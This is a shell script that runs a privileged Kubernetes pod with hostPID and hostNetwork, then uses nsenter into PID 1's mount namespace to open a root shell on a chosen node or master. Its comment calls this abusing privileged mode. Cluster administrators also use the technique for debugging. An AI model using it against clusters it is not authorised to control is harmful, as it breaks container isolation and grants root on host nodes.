#!/bin/sh
# Launch a Pod ab-using a privileged=true to land on a Kubernetes node cluster as root
node=${1}
case "${node}" in
"")
    nodeSelector=''
    podName=${USER+${USER}-}docker
    ;;
--master)
    shift
    nodeSelector='"nodeSelector": { "kubernetes.io/role": "master"},'
    podName=${USER+${USER}-}docker
    ;;
*)
    shift
    nodeName=$(kubectl get node ${node} -o template --template='{{index .metadata.labels "kubernetes.io/hostname"}}') || exit 1
    nodeSelector='"nodeSelector": { "kubernetes.io/hostname": "'${nodeName:?}'" },'
    podName=${USER+${USER}-}docker-${node}
    ;;
esac
set -x
kubectl run ${podName:?} --restart=Never -it \
    --image overriden --overrides '
{
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    '"${nodeSelector?}"'
    "tolerations": [{
        "effect": "NoSchedule",
        "key": "node-role.kubernetes.io/master"
    }],
    "containers": [
      {
        "name": "alpine",
        "image": "alpine:3.7",
        "command": [
          "nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"
        ],
        "stdin": true,
        "tty": true,
        "resources": {"requests": {"cpu": "10m"}},
        "securityContext": {
          "privileged": true
        }
      }
    ]
  }
}' --rm --attach "$@"
